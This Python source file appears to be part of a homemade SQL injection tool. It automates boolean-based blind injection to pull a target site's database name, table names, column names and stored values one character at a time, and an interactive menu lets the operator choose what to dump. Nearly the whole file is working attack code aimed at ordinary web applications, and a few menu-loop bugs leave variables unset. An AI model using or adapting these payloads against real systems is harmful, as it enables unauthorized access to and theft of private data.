import time
from Modules.RequestHandler import send_payload
from Modules.ResponseAnalyzer import analyze_response
from Modules.URLUtils import construct_test_url


def prompt_user(vulnerability_type):
    while True:
        proceed = input(f"{vulnerability_type} vulnerability detected! Proceed with exploitation? (y/n): ").lower()
        if proceed in ["y", "n"]:
            return proceed == "y"
        else:
            print("Invalid input. Please enter 'y' or 'n'.")


def exploit_boolean_based(default_response, target_url, id_value, exploitable_payload):
    length = 1
    while True:
        insertion_payload = f'IF((SELECT+LENGTH(DATABASE()))={length},1,2)%23'
        updated_payload = exploitable_payload[:-4] + insertion_payload
        test_url = construct_test_url(target_url, id_value, updated_payload)
        response = send_payload(test_url)

        if analyze_response(default_response, response, updated_payload):
            print(f"\nDatabase name length found: {length}\n")
            return length

        length += 1
        print(length)


def find_database_name(target_url, id_value, db_length, default_response, exploitable_payload):
    database_name = ""

    for i in range(1, db_length + 1):
        for ascii_code in range(32, 127):

            ascii_char = chr(ascii_code)
            insertion_payload = f"IF((SELECT+SUBSTRING(DATABASE(), {i}, 1))='{ascii_char}',1,2)%23"
            updated_payload = exploitable_payload[:-4] + insertion_payload
            test_url = construct_test_url(target_url, id_value, updated_payload)
            response = send_payload(test_url)

            if analyze_response(default_response, response, updated_payload):
                database_name += ascii_char
                print(f"Found character at position {i}: {ascii_char}\n")
                print(f"Database name: {database_name}\n")
                break
            print(ascii_char)
    return database_name


def find_table_count(target_url, id_value, default_response, exploitable_payload):
    table_count = 1
    max_attempts = 100

    while True:
        insertion_payload = f"IF((SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE())={table_count},1,2)%23"
        updated_payload = exploitable_payload[:-4] + insertion_payload
        test_url = construct_test_url(target_url, id_value, updated_payload)
        response = send_payload(test_url)

        if analyze_response(default_response, response, updated_payload):
            print(f"Found number of tables: {table_count}\n")
            return table_count

        table_count += 1

        if table_count > max_attempts:
            print("Reached maximum attempts, exiting.")
            break

    print("Unable to determine the number of tables.")
    return None


def find_table_names(target_url, id_value, table_count, default_response, exploitable_payload):
    table_names = []

    for table_index in range(table_count):
        current_table_name = ""

        for i in range(1, 51):
            for ascii_code in range(32, 127):
                ascii_char = chr(ascii_code)

                insertion_payload = (f"IF((SELECT+SUBSTRING((SELECT+TABLE_NAME+FROM+INFORMATION_SCHEMA.TABLES+WHERE"
                                     f"+TABLE_SCHEMA=DATABASE()+LIMIT+{table_index},1), {i}, 1))='{ascii_char}',1,"
                                     f"2)%23")
                updated_payload = exploitable_payload[:-4] + insertion_payload
                test_url = construct_test_url(target_url, id_value, updated_payload)
                response = send_payload(test_url)

                if analyze_response(default_response, response, updated_payload):
                    current_table_name += ascii_char
                    print(f"Found character at position {i} of table {table_index + 1}: {ascii_char}\n")
                    print(f"current table name: {current_table_name}")
                    break
                print(ascii_char)
            else:
                break

        table_names.append(current_table_name)
        print(f"Found table {table_index + 1}: {current_table_name}\n")

    print(f"All found table names: {table_names}\n")
    return table_names


def find_table_columns(target_url, id_value, table_name, default_response, exploitable_payload):
    columns = []
    column_index = 0

    while True:
        current_column_name = ""

        for i in range(1, 51):
            found_char = False
            for ascii_code in range(32, 127):
                ascii_char = chr(ascii_code)

                insertion_payload = (f"IF((SELECT+SUBSTRING((SELECT+COLUMN_NAME+FROM+INFORMATION_SCHEMA.COLUMNS+"
                                     f"WHERE+TABLE_NAME='{table_name}'+LIMIT+{column_index},1), {i}, 1))='{ascii_char}',1,2)%23")
                updated_payload = exploitable_payload[:-4] + insertion_payload
                test_url = construct_test_url(target_url, id_value, updated_payload)
                response = send_payload(test_url)

                if analyze_response(default_response, response, updated_payload):
                    current_column_name += ascii_char
                    print(f"Found character at position {i} of column {column_index + 1}: {ascii_char}\n")
                    found_char = True
                    print(f"current column name: {current_column_name}")
                    break
                print(ascii_char)
            if not found_char:
                break

        if not current_column_name:
            break

        columns.append(current_column_name)
        print(f"Found column {column_index + 1}: {current_column_name}")
        column_index += 1

    return columns


def prompt_user_and_find_columns(target_url, id_value, table_names, default_response, exploitable_payload):
    while True:
        print("Available tables:")
        for idx, table in enumerate(table_names):
            print(f"{idx + 1}: {table}")

        try:
            table_index = int(input("Choose a table by number: ")) - 1
            if 0 <= table_index < len(table_names):
                selected_table = table_names[table_index]
                print(f"Selected table: {selected_table}")

                columns = find_table_columns(target_url, id_value, selected_table, default_response,
                                             exploitable_payload)
                prompt_user_and_find_values(target_url, id_value, selected_table, columns, default_response,
                                            exploitable_payload)
                break
            else:
                print("Invalid selection. Please try again.")
        except ValueError:
            print("Invalid input. Please enter a number.")


def prompt_user_and_find_values(target_url, id_value, table_name, columns, default_response, exploitable_payload):
    while True:
        print(f"Available columns in table '{table_name}':")
        for idx, column in enumerate(columns):
            print(f"{idx + 1}: {column}")

        try:
            column_index = int(input("Choose a column by number: ")) - 1
            if 0 <= column_index < len(columns):
                selected_column = columns[column_index]
                print(f"Selected column: {selected_column}\n")

                value = find_column_values(target_url, id_value, table_name, selected_column, default_response,
                                           exploitable_payload)
                return value
            else:
                print("Invalid selection. Please try again.")
        except ValueError:
            print("Invalid input. Please enter a number.")


def find_column_values(target_url, id_value, table_name, column_name, default_response, exploitable_payload):
    values = []
    value_index = 0

    while True:
        current_value = ""

        for i in range(1, 51):
            found_char = False
            for ascii_code in range(32, 127):
                ascii_char = chr(ascii_code)

                insertion_payload = (f"IF((SELECT+SUBSTRING((SELECT+{column_name}+FROM+{table_name}+"
                                     f"LIMIT+{value_index},1), {i}, 1))='{ascii_char}',1,2)%23")
                updated_payload = exploitable_payload[:-4] + insertion_payload
                test_url = construct_test_url(target_url, id_value, updated_payload)
                response = send_payload(test_url)

                if analyze_response(default_response, response, updated_payload):
                    current_value += ascii_char
                    print(f"Found character at position {i} of value {value_index + 1}: {ascii_char}\n")
                    found_char = True
                    print(f"current value: {current_value}")
                    break
                print(ascii_char)
            if not found_char:
                break

        if not current_value:
            break

        values.append(current_value)
        print(f"Found value {value_index + 1}: {current_value}")
        value_index += 1

    print(f"All found values for column '{column_name}' in table '{table_name}': {values}")
    return values


def start_exploitation(default_response, target_url, id_value, method, exploitable_payload):
    if method == "boolean":
        db_length = exploit_boolean_based(default_response, target_url, id_value, exploitable_payload)
        db_name = find_database_name(target_url, id_value, db_length, default_response, exploitable_payload)
        table_count = find_table_count(target_url, id_value, default_response, exploitable_payload)
        table_names = find_table_names(target_url, id_value, table_count, default_response, exploitable_payload)

        found_data = []

        selected_table = None
        selected_columns = []
        selected_column = None

        # Main interaction loop
        while True:
            print("\nAvailable Options:")
            print("1: Explore tables and columns")
            print("2: View found data")
            print("3: Switch table")
            print("4: Switch column")
            print("5: Quit")
            choice = input("Choose an option by number: ")

            if choice == "1":
                if not selected_table:
                    prompt_user_and_find_columns(target_url, id_value, table_names, default_response,
                                                 exploitable_payload)
                    if selected_columns:
                        selected_table = table_names[int(input("Choose a table by number to explore: ")) - 1]
                        print(f"Exploring columns for table: {selected_table}")
                else:
                    print(f"Currently exploring table: {selected_table}")
                    column_values = prompt_user_and_find_values(target_url, id_value, [selected_table],
                                                                selected_columns,
                                                                default_response, exploitable_payload)
                    found_data.append({"Table": selected_table, "Columns": selected_columns, "Values": column_values})

            elif choice == "2":
                if found_data:
                    print("\nFound Data:")
                    for index, entry in enumerate(found_data):
                        print(
                            f"{index + 1}. Table: {entry['Table']}, Columns: {entry['Columns']}, Values: {entry['Values']}")
                else:
                    print("No data found yet.")

            elif choice == "3":
                selected_table = None
                selected_columns = []
                selected_column = None
                print("You can now choose another table to explore.")

            elif choice == "4":
                if selected_table:
                    print(f"Currently exploring columns for table: {selected_table}")
                    column_index = int(input(f"Choose a column to explore (1 to {len(selected_columns)}): ")) - 1
                    if 0 <= column_index < len(selected_columns):
                        selected_column = selected_columns[column_index]
                        print(f"Exploring column: {selected_column}")
                        prompt_user_and_find_values(target_url, id_value, [selected_table], [selected_column],
                                                    default_response, exploitable_payload)
                        found_data.append({"Table": selected_table, "Column": selected_column, "Values": column_values})
                    else:
                        print("Invalid column selection.")
                else:
                    print("No table selected. Please choose a table first.")

            elif choice == "5":
                print("Exiting the program. Goodbye!")
                break

            else:
                print("Invalid choice. Please try again.")
    elif method == "time-based":
        print("The time-based exploitation is not made yet. you can contribute and add this feature.")
